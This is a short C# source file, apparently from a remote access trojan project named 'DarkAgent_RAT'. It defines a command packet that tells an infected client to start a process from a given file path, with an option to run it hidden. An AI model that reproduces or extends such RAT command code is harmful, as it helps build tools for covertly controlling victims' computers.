using System;
using System.Collections.Generic;
using System.Text;

namespace DarkAgent_RAT.src.Network.DataNetwork.Packets.Send
{
    class S_StartProcess : SendBasePacket
    {
        private string FileLocation;
        private byte hidden;
        public S_StartProcess(RatClients client, string FileLocation, byte hidden)
            : base(client)
        {
            this.FileLocation = FileLocation;
            this.hidden = hidden;
        }
        protected internal override void Write()
        {
            WriteByte(0x11);
            WriteString(FileLocation);
            WriteByte(hidden);
        }
    }
}
